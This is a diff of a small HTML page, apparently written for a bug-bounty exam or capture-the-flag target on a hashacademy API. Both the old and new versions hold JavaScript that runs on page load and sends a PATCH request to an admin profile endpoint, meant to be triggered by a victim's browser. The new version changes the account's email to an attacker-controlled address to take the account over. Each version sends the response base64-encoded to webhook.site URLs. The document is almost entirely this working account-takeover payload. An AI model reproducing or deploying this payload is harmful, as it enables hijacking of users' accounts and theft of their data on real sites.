@@ -1,42 +1,40 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Nothing to see here</title>
+</head>
 <body>
-    <h1>Processing...</h1>
     <script>
-        const targetUrl = 'https://api-bugbounty-exam.hashacademy.co/api/auth/profile';
-        
-        // We attempt to change the admin's profile info. 
-        // If the API allows 'email', we change that to take over.
-        const data = {
-            "fullName": "Admin_Pwned_By_Me",
-            "phoneNumber": "(555) 999-0000",
-            "address": {
-                "street": "Hacker Way",
-                "city": "Tripoli",
-                "state": "LB",
-                "zipCode": "12345",
-                "country": "US"
-            }
-        };
+        // Use the Admin ID you found earlier
+        const adminId = "69d28e841cda77b519a9550e"; 
+        const webhook = "https://webhook.site/9179081b-61f3-42f5-823e-1d611bf431c3";
 
-        fetch(targetUrl, {
-            method: 'PATCH',
-            mode: 'cors', // Required for cross-origin
-            credentials: 'include', // Tells the bot to send its cookies
-            headers: {
-                'Content-Type': 'application/json',
-                // Note: We omit X-Participant-Token and hope the API doesn't require it for admins
-            },
-            body: JSON.stringify(data)
-        })
-        .then(response => response.json())
-        .then(result => {
-            // Send the result to your webhook so you can see if it worked
-            fetch('https://webhooksite.net/9179081b-61f3-42f5-823e-1d611bf431c3?status=success&res=' + btoa(JSON.stringify(result)));
-        })
-        .catch(err => {
-            fetch('https://webhook.site/9299acf8-393a-4d83-9963-c5763588fb5e?status=error&msg=' + btoa(err));
-        });
+        async function triggerATO() {
+            try {
+                const response = await fetch('https://api-bugbounty-exam.hashacademy.co/api/auth/profile', {
+                    method: 'PATCH',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    // Attempting to change the name to the flag indicator 
+                    // and changing the email to one you control (if the API allows it)
+                    body: JSON.stringify({
+                        "fullName": "Pwned_Admin_Flag",
+                        "email": "ladybughunter1@gmail.com" 
+                    })
+                });
+
+                const data = await response.json();
+                
+                // Report back to your webhook with the response data
+                fetch(`${webhook}?status=success&data=${btoa(JSON.stringify(data))}`);
+            } catch (err) {
+                // If it fails (e.g., CSP or CORS), report the error
+                fetch(`${webhook}?status=error&msg=${btoa(err.message)}`);
+            }
+        }
+
+        triggerATO();
     </script>
 </body>
 </html>
